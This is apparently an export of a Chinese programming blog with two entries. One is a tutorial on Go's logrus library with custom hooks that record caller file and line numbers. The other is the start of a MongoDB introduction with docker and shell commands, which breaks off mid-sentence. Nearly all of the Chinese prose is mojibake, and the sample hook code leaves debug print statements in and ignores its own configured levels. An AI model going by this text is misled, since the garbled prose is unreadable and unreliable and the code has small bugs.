‰Ω†ÂèØ‰ª•ÈÄöËøáÊèí‰ª∂Â∞Ü‰Ω†ÁöÑÊó•ÂøóÂèëÂæÄ‰ªªÊÑèÂú∞Êñπ, ÊØîÂ¶ÇÊñá‰ª∂, Ê†áÂáÜËæìÂá∫, logstash, influxdb, ‚Ä¶„ÄÇËøôÊ≠£ÂºèÂÆÉÊúÄÂê∏Âºï‰∫∫ÁöÑÂú∞Êñπ„ÄÇ ‰ΩøÁî®logrusÊúâ6‰∏™Êó•ÂøóÁ≠âÁ∫ß, ÂàÜÂà´‰∏∫: Debug,Info,Warn,Error,Fatal,Panic, ÁªèËøáÁÆÄÂçïÁöÑÈÖçÁΩÆÂ∞±ÂèØ‰ª•‰ΩøÁî®‰∫Ü„ÄÇlogrusÊúâ2Áßçformater, ÂàÜÂà´ÊòØ: JSONFormatter, TextFormatter, ÂΩìÁÑ∂Â¶ÇÊûú‰Ω†ËßâÂæóÈÉΩ‰∏çÊòØ‰Ω†ÊÉ≥Ë¶ÅÁöÑ, ÂèØ‰ª•ÈÄöËøáÂÆûÁé∞FormatterÊé•Âè£ÂÆöÂà∂Ëá™Â∑±ÁöÑformater Âü∫Á°Ä‰ΩøÁî®ÂΩìÂàùÂßãÂåñÂ•ΩlogrusÂêé, ÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî®DebugÁ≠âËøõË°åÊó•ÂøóËÆ∞ÂΩï„ÄÇWithFieldsÊòØ‰∏Ä‰∏™ÂæàÂ•ΩÁî®ÁöÑÂäüËÉΩ, ÂÆÉÁî®‰∫éËÆ∞ÂΩï‰Ω†ËøôÊù°messageÁöÑ‰∏Ä‰∫õÂÖÉÊï∞ÊçÆ‰ø°ÊÅØ, ÊØîÂ¶Ç‰Ω†ÂèØ‰ª•ËÆ∞ÂΩïÊòØÊúâÈÇ£‰∏™ËÆøÈóÆËß¶ÂèëÁöÑ(request_id) 123456789101112131415161718192021package mainimport ( "os" "github.com/sirupsen/logrus")func main() &#123; logrus.WithFields(logrus.Fields&#123;"animal": "walrus","size": 10&#125;).Info("A group of walrus emerges from the ocean") logrus.WithFields(logrus.Fields&#123;"request_id": "requestA"&#125;).Warn("The group's number increased tremendously!") logrus.WithFields(logrus.Fields&#123;"request_id": "requestB"&#125;).Fatal("The ice breaks!")&#125;func init() &#123; // ‰ª•JSONÊ†ºÂºè‰∏∫ËæìÂá∫Ôºå‰ª£ÊõøÈªòËÆ§ÁöÑASCIIÊ†ºÂºè logrus.SetFormatter(&amp;logrus.JSONFormatter&#123;&#125;) // ‰ª•Stdout‰∏∫ËæìÂá∫Ôºå‰ª£ÊõøÈªòËÆ§ÁöÑstderr logrus.SetOutput(os.Stdout) // ËÆæÁΩÆÊó•ÂøóÁ≠âÁ∫ß logrus.SetLevel(logrus.WarnLevel)&#125; ‰ΩøÁî®LoggerloggerÊòØ‰∏ÄÁßçÁõ∏ÂØπÈ´òÁ∫ßÁöÑÁî®Ê≥ï, ÂØπ‰∫é‰∏Ä‰∏™Â§ßÂûãÈ°πÁõÆ, ÂæÄÂæÄÈúÄË¶Å‰∏Ä‰∏™ÂÖ®Â±ÄÁöÑloggerÂØπË±°, Áî®‰∫éËÆ∞ÂΩïÈ°πÁõÆÊâÄÊúâÁöÑÊó•Âøó 1234567logger := logrus.New()logger.Formatter = &amp;logrus.JSONFormatter&#123;&#125;// Use logrus for standard log output// Note that `log` here references stdlib's log// Not logrus imported under the name `log`.log.SetOutput(logger.Writer()) HookÂÆòÊñπÊúâÂæàÂ§öÁé∞ÊàêÁöÑHook, ÂèØ‰ª•ÂÆûÁé∞ ËÆ∞ÂΩïÊó•ÂøóÂà∞Êñá‰ª∂(Êó•ÂøóÊñá‰ª∂ËΩÆËΩ¨), ËÆ∞ÂΩïÂà∞kafka, ËÆ∞ÂΩïÂà∞influxDB, ËÆ∞ÂΩïÂà∞MySQL‚Ä¶ 1234567891011121314151617181920import ( log "github.com/sirupsen/logrus" "gopkg.in/gemnasium/logrus-airbrake-hook.v2" // the package is named "aibrake" logrus_syslog "github.com/sirupsen/logrus/hooks/syslog" "log/syslog")func init() &#123; // Use the Airbrake hook to report errors that have Error severity or above to // an exception tracker. You can create custom hooks, see the Hooks section. log.AddHook(airbrake.NewHook(123, "xyz", "production")) hook, err := logrus_syslog.NewSyslogHook("udp", "localhost:514", syslog.LOG_INFO, "") if err != nil &#123; log.Error("Unable to connect to local syslog daemon") &#125; else &#123; log.AddHook(hook) &#125;&#125; ÈóÆÈ¢ò‰∏ãÈù¢Ëøô‰∏™ÈóÆÈ¢òÊòØÊàë‰ª¨ÈÅáÂà∞ÁöÑÊúÄÈÉÅÈó∑ÁöÑÈóÆÈ¢ò, Âõ†‰∏∫Â∞±ËøûÊ†áÂáÜÂ∫ìÈÉΩÂ∑≤ÁªèÂÆûÁé∞ÁöÑÂäüËÉΩ,Ê≤°ÊÉ≥Âà∞logrus‰ºö‰∏çÊèê‰æõ„ÄÇ ‰∏çËÆ∞ÂΩïÊñá‰ª∂ÂêçÂíåË°åÂè∑‰ΩøÁî®logrusÊúâ‰∏Ä‰∏™ÂæàË¶ÅÂëΩÁöÑÈóÆÈ¢ò: ‰∏ç‰ºöËÆ∞ÂΩïÊó•ÂøóÊâìÂç∞ÁöÑË°åÂè∑ÂíåÊñá‰ª∂Âêç, ËøôÂú®ÊéíÈîôÊó∂‰ºöÊòæÂæóÂæà‰∏çÊñπ‰æø, ËÄågithub‰∏äÂÖ≥‰∫élog filename and line numberÁöÑissueÂ∑≤ÁªèÊåÇ‰∫Ü3Âπ¥‰∫Ü, Â§ßÂÆ∂Ëß£ÂÜ≥ÁöÑÂäûÊ≥ïÂ§ßËá¥‰∏∫2Á±ª: Ëá™Â∑±ÂÜôhookÊù•ËÆ∞ÂΩï 1234567891011121314151617181920212223type ContextHook struct &#123;&#125;func (hook ContextHook) Levels() []log.Level &#123; return log.AllLevels&#125;func (hook ContextHook) Fire(entry *log.Entry) error &#123; if pc, file, line, ok := runtime.Caller(8); ok &#123; funcName := runtime.FuncForPC(pc).Name() entry.Data["file"] = path.Base(file) entry.Data["func"] = path.Base(funcName) entry.Data["line"] = line &#125; return nil&#125;func main() &#123; log.AddHook(ContextHook&#123;&#125;) ‚Ä¶&#125; ÈÄöËøáË£ÖÈ•∞Âô®Ê®°ÂºèÊù•ÂåÖË£Ö‰∏ÄÂ±Ç 123456789101112131415161718192021222324252627282930313233343536373839package loggerimport ( "fmt" "net/http" "runtime" "strings" "github.com/Sirupsen/logrus")/* truncated */// Decorate appends line, file and function context to the logger and returns a function to call before// each logfunc Decorate(logger *logrus.Entry) func() *logrus.Entry &#123; return func() *logrus.Entry &#123; if pc, f, line, ok := runtime.Caller(1); ok &#123; fnName := runtime.FuncForPC(pc).Name() file := strings.Split(f, "mobilebid")[1] caller := fmt.Sprintf("%s:%v %s", file, line, fnName) return logrus.WithField("caller", caller) &#125; return logger &#125;&#125;// Log appends line, file and function context to the loggerfunc Log() *logrus.Entry &#123; if pc, f, line, ok := runtime.Caller(1); ok &#123; fnName := runtime.FuncForPC(pc).Name() file := strings.Split(f, "mobilebid")[1] caller := fmt.Sprintf("%s:%v %s", file, line, fnName) return logrus.WithField("caller", caller) &#125; return &amp;logrus.Entry&#123;&#125;&#125; ‰∏™‰∫∫ÂÅèÂêë‰∫éËá™Â∑±ÂÆûÁé∞‰∏Ä‰∏™hookÁöÑÂ§ÑÁêÜÊñπÂºè, Ëøô‰πüÊòØ‰ΩúËÄÖÊØîËæÉËÆ§ÂèØÁöÑ‰∏ÄÁßçÊñπÂºè, ‰ΩúËÄÖÂéüËØùÊòØËøôÊ†∑ËØ¥ÁöÑYes, unless someone can prove a negligible performance impact I think this should be a hook., Âõ†Ê≠§ÊàëÊµãËØï‰∫Ü‰∏äÈù¢ÈÇ£ÊÆµËá™Â∑±ÂÆûÁé∞ContextHookÁöÑ‰ª£Á†Å, ÂæàÈÅóÊÜæ, Â±ÖÁÑ∂Ê≤°ÊàêÂäü, Âõ†Ê≠§‰∏çÂæó‰∏çËá™Â∑±ÂÜô‰∏Ä‰∏™ContextHook, È°∫‰æø‰∫ÜËß£‰∏ãËé∑ÂèñfilenameÂíåline numberÁöÑÂéüÁêÜ„ÄÇ Ëé∑ÂèñÊñá‰ª∂ÂêçÂíåË°åÂè∑ÁöÑÂéüÁêÜÂú®runtimeÈáåÈù¢Êúâ‰∏Ä‰∏™callerÂáΩÊï∞, Ê∫êÁ†ÅÈáåÈù¢ÊòØËøôÊ†∑ÊèèËø∞callerÁöÑ:12345Caller reports file and line number information about function invocations on the calling goroutine&apos;s stack. The argument skip is the number of stack frames to ascend, with 0 identifying the caller of Caller. (For historical reasons the meaning of skip differs between Caller and Callers.) The return values report the program counter, file name, and line number within the file of the corresponding call. The boolean ok is false if it was not possible to recover the information. ÁÆÄËÄåË®Ä‰πã, Êàë‰ª¨ÈÄöËøácallerÂèØ‰ª•ËøΩË∏™ÊØè‰∏ÄÊ¨°ÂáΩÊï∞Ë∞ÉÁî®ÁöÑÊñá‰ª∂ÂíåË°åÂè∑‰ø°ÊÅØ, ‰ΩÜÊòØÊàë‰ª¨ÁöÑÂáΩÊï∞Ë∞ÉÁî®ÈìæÂæÄÂæÄÊúâÊ∑±, ËÄåÊàë‰ª¨ÈúÄË¶ÅÁöÑ‰ªÖ‰ªÖÊòØËÆ∞ÂΩïÊó•ÂøóÊó∂ÁöÑÈÇ£‰∏ÄÂ±ÇÁöÑÂáΩÊï∞Ë∞ÉÁî®‰ø°ÊÅØ„ÄÇÂ¶Ç‰ΩïÊâæÂà∞Ëøô‰∏ÄÂ±ÇÂñÉ?Êàë‰ª¨ÂèØ‰ª•ÊääÊØè‰∏ÄÂ±ÇÈÉΩÊâìÂç∞Âá∫Êù•, ÁúãÁúãÊúâÂï•ËßÑÂæã:123456789101112131415161718/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 98/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 134/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/logger.go: 181/Users/maojun/GoWorkDir/src/openauth/cmd/openauth/cmd/service.go: 55.../Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 98/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 134/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 182/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/logger.go: 118/Users/maojun/GoWorkDir/src/openauth/api/http/handler/init.go: 42.../Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 98/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/entry.go: 144/Users/maojun/GoWorkDir/src/openauth/vendor/github.com/sirupsen/logrus/logger.go: 189/Users/maojun/GoWorkDir/src/openauth/api/http/server.go: 71... Êàë‰ª¨ÂèØ‰ª•ÁúãÂá∫ÂâçÈù¢Âá†Ê¨°Ë∞ÉÁî®Èìæ, ÈÉΩË¢´logrusËá™Â∑±‰ΩøÁî®‰∫Ü, Âõ†Ê≠§Êàë‰ª¨‰ªÖÈúÄË¶ÅÈô§ÂéªlogrusË∞ÉÁî®ÈìæÁöÑÂáΩÊï∞, ÁÑ∂ÂêéÁ¨¨‰∏Ä‰∏™Ë¢´ÊâæÂà∞ÁöÑÂ∞±ÊòØÊàë‰ª¨ËÆ∞ÂΩïÊó•ÂøóÁöÑË∞ÉÁî®‰∫Ü, ÊØîÂ¶ÇÊúÄÂêé‰∏Ä‰∏™: http/server.go: 71, ÊàëÂú®ËøôÈáåË∞ÉÁî®logrus: logger.Debug(‚Äúmsg‚Äù) ÈÇ£‰πàlogrusÁöÑË∞ÉÁî®ÈìæÊúÄÂ§öÊúâÂá†Â±ÇÂñÉÔºüÊàë‰ª¨ÊâßË°åÂ§öÂ∞ëÊ¨°ÈÄíÂΩíÊâçËÉΩÊâæÂà∞Êàë‰ª¨Ëá™Â∑±ÁöÑdebug callÔºü12cmd/service.go: 55 [logger.Debug()] ---&gt; logrus/logger.go: 181 [entry.Debug()] ---&gt; logrus/entry.go: 134 [entry.log()] ---&gt; logrus/entry.go: 98 [entry.Logger.Hooks.Fire()]handler/init.go: 42 [logger.Debugf()] ---&gt; logrus/logger.go: 118 [entry.Debug()] ---&gt; logrus/entry.go: 182 [logger.releaseEntry()] ---&gt; logrus/entry.go: 134 [entry.log()] ---&gt; logrus/entry.go: 98 [entry.Logger.Hooks.Fire()] Áî±Ê≠§Êàë‰ª¨ÂèØ‰ª•ÁúãÂá∫ÂΩìÊàë‰ª¨‰ΩøÁî®(Debug, Debugf, Debugln), Â∫ïÂ±ÇË∞ÉÁî®ÈìæÁöÑÈïøÂ∫¶Â§ßËá¥‰∏∫3~4Â±Ç, Âõ†Ê≠§Êàë‰ª¨ÊúÄÂ∞ëÈúÄË¶ÅÈÄíÂΩí5Ê¨°ÊâçËÉΩÊâæÂà∞Êàë‰ª¨Ëá™Â∑±ÁöÑdebug call. ÊúÄÂêéÊâæÂà∞‰∫ÜËÆ∞ÂΩï‰∏ãÊù•Â∞±ok‰∫Ü„ÄÇ Ëá™Â∑±ÂÆûÁé∞‰∏Ä‰∏™ContextHookÂ¶Ç‰ΩïÂÆûÁé∞‰∏Ä‰∏™logrusÁöÑhookÂñÉ?123456789// A hook to be fired when logging on the logging levels returned from// `Levels()` on your implementation of the interface. Note that this is not// fired in a goroutine or a channel with workers, you should handle such// functionality yourself if your call is non-blocking and you don't wish for// the logging calls for levels returned from `Levels()` to block.type Hook interface &#123; Levels() []Level Fire(*Entry) error&#125; ‰∏Ä‰∏™Entry‰∏∫‰∏ÄÊù°Êó•ÂøóËÆ∞ÂΩï, Êàë‰ª¨ÁöÑHookÈúÄË¶ÅÂÅöÁöÑÂ∞±ÊòØÂú®ÊØè‰∏Ä‰∏™Êù°ÁöÑÊó•ÂøóËÆ∞ÂΩïÈáåÈù¢Ê∑ªÂä†Ë∞ÉÁî®Êó∂ÁöÑÊñá‰ª∂ÂêçÂíåË°åÂè∑. Ê†∏ÂøÉÂ∞±ÊòØÂÆûÁé∞Ëá™Â∑±ÁöÑFireÊñπÊ≥ï, ‰ª•‰∏ãÊòØÂèÇËÄÉÂÆûÁé∞:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384package hooksimport ( "fmt" "runtime" "strings" "github.com/sirupsen/logrus")// ContextHook for log the call contexttype contextHook struct &#123; Field string Skip int levels []logrus.Level&#125;// NewContextHook use to make an hook// Ê†πÊçÆ‰∏äÈù¢ÁöÑÊé®Êñ≠, Êàë‰ª¨ÈÄíÂΩíÊ∑±Â∫¶ÂèØ‰ª•ËÆæÁΩÆÂà∞5Âç≥ÂèØ.func NewContextHook(levels ...logrus.Level) logrus.Hook &#123; hook := contextHook&#123; Field: "source", Skip: 5, levels: levels, &#125; if len(hook.levels) == 0 &#123; hook.levels = logrus.AllLevels &#125; return &amp;hook&#125;// Levels implement levelsfunc (hook contextHook) Levels() []logrus.Level &#123; return logrus.AllLevels&#125;// Fire implement firefunc (hook contextHook) Fire(entry *logrus.Entry) error &#123; entry.Data[hook.Field] = findCaller(hook.Skip) return nil&#125;// ÂØπcallerËøõË°åÈÄíÂΩíÊü•ËØ¢, Áõ¥Âà∞ÊâæÂà∞ÈùûlogrusÂåÖ‰∫ßÁîüÁöÑÁ¨¨‰∏Ä‰∏™Ë∞ÉÁî®.// Âõ†‰∏∫filenameÊàëËé∑ÂèñÂà∞‰∫Ü‰∏äÂ±ÇÁõÆÂΩïÂêç, Âõ†Ê≠§ÊâÄÊúâlogrusÂåÖÁöÑË∞ÉÁî®ÁöÑÊñá‰ª∂ÂêçÈÉΩÊòØ logrus/...// Âõ†Ê≠§ÈÄöËøáÊéíÈô§logrusÂºÄÂ§¥ÁöÑÊñá‰ª∂Âêç, Â∞±ÂèØ‰ª•ÊéíÈô§ÊâÄÊúâlogrusÂåÖÁöÑËá™Â∑±ÁöÑÂáΩÊï∞Ë∞ÉÁî®func findCaller(skip int) string &#123; file := "" line := 0 for i := 0; i &lt; 10; i++ &#123; file, line = getCaller(skip + i) if !strings.HasPrefix(file, "logrus") &#123; break &#125; &#125; return fmt.Sprintf("%s:%d", file, line)&#125;// ËøôÈáåÂÖ∂ÂÆûÂèØ‰ª•Ëé∑ÂèñÂáΩÊï∞ÂêçÁß∞ÁöÑ: fnName := runtime.FuncForPC(pc).Name()// ‰ΩÜÊòØÊàëËßâÂæóÊúâ Êñá‰ª∂ÂêçÂíåË°åÂè∑Â∞±Â§üÂÆö‰ΩçÈóÆÈ¢ò, Âõ†Ê≠§ÂøΩÁï•‰∫ÜcallerËøîÂõûÁöÑÁ¨¨‰∏Ä‰∏™ÂÄº:pc// Âú®Ê†áÂáÜÂ∫ìlogÈáåÈù¢Êàë‰ª¨ÂèØ‰ª•ÈÄâÊã©ËÆ∞ÂΩïÊñá‰ª∂ÁöÑÂÖ®Ë∑ØÂæÑÊàñËÄÖÊñá‰ª∂Âêç, ‰ΩÜÊòØÂú®‰ΩøÁî®ËøáÁ®ãÊàêÂπ∂ÂèëÊúÄÂêàÈÄÇÁöÑ,// Âõ†‰∏∫Êñá‰ª∂ÁöÑÂÖ®Ë∑ØÂæÑÂæÄÂæÄÂæàÈïø, ËÄåÊñá‰ª∂ÂêçÂú®Â§ö‰∏™ÂåÖ‰∏≠ÂæÄÂæÄÊúâÈáçÂ§ç, Âõ†Ê≠§ËøôÈáåÈÄâÊã©Â§öÂèñ‰∏ÄÂ±Ç, ÂèñÂà∞Êñá‰ª∂ÊâÄÂú®ÁöÑ‰∏äÂ±ÇÁõÆÂΩïÈÇ£Â±Ç.func getCaller(skip int) (string, int) &#123; _, file, line, ok := runtime.Caller(skip) fmt.Println(file) fmt.Println(line) if !ok &#123; return "", 0 &#125; n := 0 for i := len(file) - 1; i &gt; 0; i-- &#123; if file[i] == '/' &#123; n++ if n &gt;= 2 &#123; file = file[i+1:] break &#125; &#125; &#125; return file, line&#125;]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>log</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB‰ªãÁªç‰∏éGolangÈ©±Âä®‰ΩøÁî®]]></title>
    <url>%2F2017%2F11%2F22%2Fgolang-mongodb%2F</url>
    <content type="text"><![CDATA[Âú®‰∏äÁØáÂçöÂÆ¢‰∏≠‰ªãÁªç‰∫ÜNoSQL‰ª•ÂèäÊñáÊ°£Êï∞ÊçÆÂ∫ì, ËøôÁØáÂçöÂÆ¢‰ªãÁªçÂΩì‰∏ãÊúÄÊµÅË°åÁöÑÊñáÊ°£Êï∞ÊçÆÂ∫ì:MongoDB„ÄÇ MongoDBÁÆÄ‰ªãmongodbÊòØ‰∏Ä‰∏™Âü∫‰∫éÂàÜÂ∏ÉÂºèÊñá‰ª∂Â≠òÂÇ®ÁöÑÊï∞ÊçÆÂ∫ì„ÄÇÁî±C++ËØ≠Ë®ÄÁºñÂÜô„ÄÇÊó®Âú®‰∏∫WEBÂ∫îÁî®Êèê‰æõÂèØÊâ©Â±ïÁöÑÈ´òÊÄßËÉΩÊï∞ÊçÆÂ≠òÂÇ®Ëß£ÂÜ≥ÊñπÊ°à„ÄÇÂÆÉÊòØ‰∏Ä‰∏™‰ªã‰∫éÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÂíåÈùûÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ì‰πãÈó¥ÁöÑ‰∫ßÂìÅÔºåÊòØÈùûÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÂΩì‰∏≠ÂäüËÉΩÊúÄ‰∏∞ÂØåÔºåÊúÄÂÉèÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÁöÑ„ÄÇ mongodbË¢´ÂêÑÁßçËßÑÊ®°ÁöÑÂÖ¨Âè∏„ÄÅÂêÑ‰∏™Ë°å‰∏ö„ÄÅ‰ª•ÂèäÂêÑÁßçÂ∫îÁî®Á®ãÂ∫èÊâÄ‰ΩøÁî®, ÂÆÉÊòØÁÅµÊ¥ªÁöÑÊï∞ÊçÆÂ∫ì, ÈöèÁùÄÂ∫îÁî®Á®ãÂ∫èÁöÑÂèëÂ±ï, mongodbËÉΩÈÄÇÂ∫îÁ®ãÂ∫èschemaÁöÑÂø´ÈÄüÊîπÂèò(schema free), ÂêåÊó∂ËøòÊèê‰æõÂºÄÂèë‰∫∫ÂëòÊâÄÊúüÊúõÁöÑ‰º†ÁªüÊï∞ÊçÆÂ∫ìÁöÑÂäüËÉΩÔºåÊØîÂ¶Ç‰∫åÁ∫ßÁ¥¢ÂºïÔºåÂÆåÊï¥ÁöÑÊü•ËØ¢ËØ≠Ë®ÄÂíå‰∏•Ê†ºÁöÑ‰∏ÄËá¥ÊÄß„ÄÇ mongodbÊúâÁùÄ‰∏Ä‰∏™‰∏∞ÂØåÁöÑÂÆ¢Êà∑Á´ØÁîüÊÄÅÁ≥ªÁªü, ÂåÖÊã¨hadoopÁöÑÈõÜÊàê, ÂÆòÊñπÊèê‰æõ10Â§öÁßçÁºñÁ®ãËØ≠Ë®ÄÁöÑÈ©±Âä®, ËÄåÁî®Êà∑Á§æÂå∫Êèê‰æõÈ´òËææ40Â§öÁßçÁöÑÈ©±Âä®, ÂêéÈù¢‰ºö‰∏ìÈó®‰ªãÁªçGolangÁöÑMongoDBÈ©±Âä®mgoÁöÑ‰ΩøÁî®„ÄÇ mongodbÁöÑÊµÅË°åÁ¶ª‰∏çÂºÄ‰ªñÁöÑËøô‰∫õ‰ºòÁÇπ: json: Èù¢ÂêëjsonÁöÑÊñáÊ°£Â≠òÂÇ®ÔºåÊìç‰ΩúËµ∑Êù•ÊØîËæÉÁÆÄÂçïÂíåÂÆπÊòì, Â∫ïÂ±ÇÂ≠òÂÇ®‰∏∫Bson(‰∫åËøõÂà∂ÁöÑjson) schema free: ÁâπÂà´ÈÄÇÂêàÂ≠òÂÇ®ÂçäÁªìÊûÑÂåñÁöÑÊï∞ÊçÆ„ÄÇ performance: c++ÁºñÂÜô, ÊîØÊåÅÂÖ®ÊñáÁ¥¢Âºï, Âü∫‰∫éÂÜÖÂ≠òÊò†Â∞ÑÊäÄÊúØ(Memory-mapped files) scalable: Replication, Auto-sharding query: ÊîØÊåÅ‰∏∞ÂØåÁöÑÊü•ËØ¢Ë°®ËææÂºè„ÄÇÊü•ËØ¢Êåá‰ª§‰ΩøÁî®JSONÂΩ¢ÂºèÁöÑÊ†áËÆ∞ÔºåÂèØËΩªÊòìÊü•ËØ¢ÊñáÊ°£‰∏≠ÂÜÖÂµåÁöÑÂØπË±°ÂèäÊï∞ÁªÑ, Âπ∂‰∏îÂæàÈ´òÊïà(queries run in parallel on all shards) map/reduce: MapÂáΩÊï∞ÂíåReduceÂáΩÊï∞ÊòØ‰ΩøÁî®JavascriptÁºñÂÜôÁöÑ, Âπ∂ÂèØ‰ª•ÈÄöËøádb.runCommandÊàñmapreduceÂëΩ‰ª§Êù•ÊâßË°åMapReduceÊìç‰Ωú„ÄÇ udf: ÂèØ‰ª•Áî®JavascriptÁºñÂÜôÊüê‰∏™ÂáΩÊï∞ÔºåÁõ¥Êé•Âú®ÊúçÂä°Á´ØÊâßË°åÔºå‰πüÂèØ‰ª•ÊääÂáΩÊï∞ÁöÑÂÆö‰πâÂ≠òÂÇ®Âú®ÊúçÂä°Á´ØÔºå‰∏ãÊ¨°Áõ¥Êé•Ë∞ÉÁî®Âç≥ÂèØ„ÄÇ file storage: GridFSÊòØMongoDB‰∏≠ÁöÑ‰∏Ä‰∏™ÂÜÖÁΩÆÂäüËÉΩÔºåÂèØ‰ª•Áî®‰∫éÂ≠òÊîæÂ§ßÈáèÂ∞èÊñá‰ª∂„ÄÇ suport many language: ÊîØÊåÅÂêÑÁßçÁºñÁ®ãËØ≠Ë®Ä:RUBYÔºåPYTHONÔºåJAVAÔºåC++ÔºåPHPÔºåC#Á≠âÂ§öÁßçËØ≠Ë®Ä„ÄÇ opensource: ÂºÄÊ∫ê‰ΩÜÊòØËÉåÂêéÊúâÂïÜ‰∏öÂÖ¨Âè∏ÊîØÊåÅ(10gen), ÂΩìÁÑ∂‰πüÊúâ‰ºÅ‰∏öÁâà„ÄÇ docs: ÂÆåÂñÑÁöÑÊñáÊ°£, Êó†ËÆ∫ÊòØÊû∂ÊûÑ, ÂÆâË£Ö, ‰ΩøÁî®ËøòÊòØÂÖ∂‰ªñ, ÂÆòÊñπÊèê‰æõÂÆåÂñÑÁöÑÊñáÊ°£ÊîØÊåÅ„ÄÇÂπ∂‰∏îÂÆâË£ÖÁÆÄÂçï„ÄÇ Âõ†‰∏∫mongoÊñáÊ°£ÂæàÂÆåÂñÑ, Âõ†Ê≠§ÂÆâË£ÖËØ∑Áúãmongod unbuntu ÂÆâË£ÖÊñáÊ°£„ÄÇÂΩìÂâçÁ®≥ÂÆöÁâà‰∏∫3.4, ÂêéÈù¢ÁöÑÊµãËØïÈÉΩÊòØÂü∫‰∫é3.4ÁâàÊú¨ËøõË°åËØ¥ÊòéÁöÑ„ÄÇ‰∏∫‰∫ÜÊñπ‰æøÊàë‰ΩøÁî®dockerËøõË°åÂÆâË£Ö:1234567891011121314151617181920maojun@maojun-mbp $ docker pull mongo:3.4# Â¶ÇÊûú‰Ω†ÈúÄË¶ÅÊääÊï∞ÊçÆÊñá‰ª∂ÊåÇËΩΩÂá∫Âéª, Èò≤Ê≠¢‰∏¢Â§±ÂèØ‰ª•:# docker run -p 27017:27017 -v $PWD/db:/data/db -d mongo:3.4# ‰ΩÜÊòØÊàëÊú¨Ë∫´Â∞±ÊòØÊµãËØïÁéØÂ¢É, ÂÆπÂô®Âà†‰∫ÜÂ∞±ËÆ©‰ªñÂà†‰∫ÜÂêß:docker run -p 27017:27017 -d mongo:3.419ceeb4814632f089a0a78bb98af83d9fb49cb377aae2534d67881851bf6644e# ËøõÂÖ•ÂÆπÂô®ÊµãËØï‰∏ãmongo shellÊòØÂê¶Ê≠£Â∏∏:maojun@maojun-mbp $ docker exec -it 19c /bin/bashroot@19ceeb481463:/# mongoMongoDB shell version v3.4.10connecting to: mongodb://127.0.0.1:27017MongoDB server version: 3.4.10Welcome to the MongoDB shell.For interactive help, type "help".For more comprehensive documentation, see http://docs.mongodb.org/Questions? Try the support group http://groups.google.com/group/mongodb-user&gt; dbtest Âü∫Á°ÄÊ¶ÇÂøµËß£Êûê‰∏çÁÆ°Êàë‰ª¨Â≠¶‰π†‰ªÄ‰πàÊï∞ÊçÆÂ∫ìÈÉΩÂ∫îËØ•Â≠¶‰π†ÂÖ∂‰∏≠ÁöÑÂü∫Á°ÄÊ¶ÇÂøµ, Âú®mongodb‰∏≠Âü∫Êú¨ÁöÑÊ¶ÇÂøµÊòØÊñáÊ°£„ÄÅÈõÜÂêà„ÄÅÊï∞ÊçÆÂ∫ì, Â¶ÇÊûúÂØπÊØî‰º†ÁªüÊï∞ÊçÆÂ∫ìÁöÑË°®, ÈÇ£‰πà‰∏ãÈù¢ËøôÂº†ÂõæÂèØ‰ª•Â∏ÆÁªÑÊàë‰ª¨Âø´ÈÄüÁêÜËß£MongoDBÈáåÈù¢Ëøô‰∫õÂü∫Êú¨Ê¶ÇÂøµ: Êï∞ÊçÆÂ∫ì(DB)ÂØπÂ∫î‰∫é‰º†ÁªüÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ì, DBÂ∞±ÊòØË°®ÁöÑÈõÜÂêà, ËÄåMongoÈáåÈù¢DBÊòØCollectionsÁöÑÈõÜÂêà„ÄÇ‰ΩÜÊòØÂØπ‰∫é‰º†ÁªüÁöÑÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìËÄåË®Ä, Âú®‰ΩøÁî®‰∏äÊúâÁï•ÂæÆÁöÑÂå∫Âà´: Âä®ÊÄÅÂàõÂª∫: mongodbÁöÑdb‰∏çÁî®ÂçïÁã¨ÂàõÂª∫, Â¶ÇÊûú‰ΩøÁî®Êó∂Ê≤°ÊúâÂ∞±‰ºöË¢´Ëá™Âä®ÂàõÂª∫„ÄÇ ‰ΩøÁî®ÊñπÂºè: ÈÄöËøá show dbsÊü•ÁúãÊï∞ÊçÆÂ∫ì, ÈÄöËøá use dbNameÂàáÊç¢Êï∞ÊçÆÂ∫ì, ÈÄöËøádbÊü•ÁúãÂΩìÂâç‰ΩøÁî®ÁöÑÊï∞ÊçÆÂ∫ì, ÈÄöËøáshow collectionsÊü•ÁúãÊâÄÊúâÁöÑÈõÜÂêà(Ë°®) 1234567891011121314&gt; show dbsadmin 0.078GBgateway 0.078GBlocal 0.078GB&gt;&gt; use gatewayswitched to db gateway&gt;&gt; show collections;students&gt;&gt; dbgateway&gt; ÊñáÊ°£(Document)ÊñáÊ°£ÊòØMongoDBÈáåÈù¢ÊúÄÈáçË¶ÅÁöÑÊ¶ÇÂøµ, ‰Ω†ÂèØ‰ª•Â∞ÜÂÆÉÁêÜËß£‰∏∫ÂÖ≥Á≥ªÂûãÊï∞ÊçÆÁöÑ‰∏≠Row,‰∏Ä‰∏™ÊñáÊ°£Áõ∏ÂΩì‰∫émysql‰∏≠ÁöÑ‰∏ÄË°å, ÊñáÊ°£ÁªÑÁªáÁöÑÊ†ºÂºèÊòØJsonÈ£éÊ†º, Â¶Ç‰∏ã: ‰ΩÜÊòØmongodbÂπ∂‰∏ç‰ºöÂ≠òÂÇ®ÁöÑJson, 